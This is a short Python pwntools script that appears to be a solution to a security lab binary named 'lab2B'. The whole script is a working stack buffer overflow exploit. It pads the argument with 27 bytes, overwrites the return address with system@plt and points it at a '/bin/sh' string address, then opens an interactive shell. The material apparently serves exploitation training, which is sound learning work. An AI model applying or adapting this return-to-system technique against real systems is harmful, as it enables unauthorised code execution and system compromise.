#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 27
    system_plt = p32(0x8048590)
    sh_address = p32(0x080487d0)
    payload = junk + system_plt + "BBBB" + sh_address
    p = process(['./lab2B', payload])
    p.interactive()

if __name__ == "__main__":
    main()
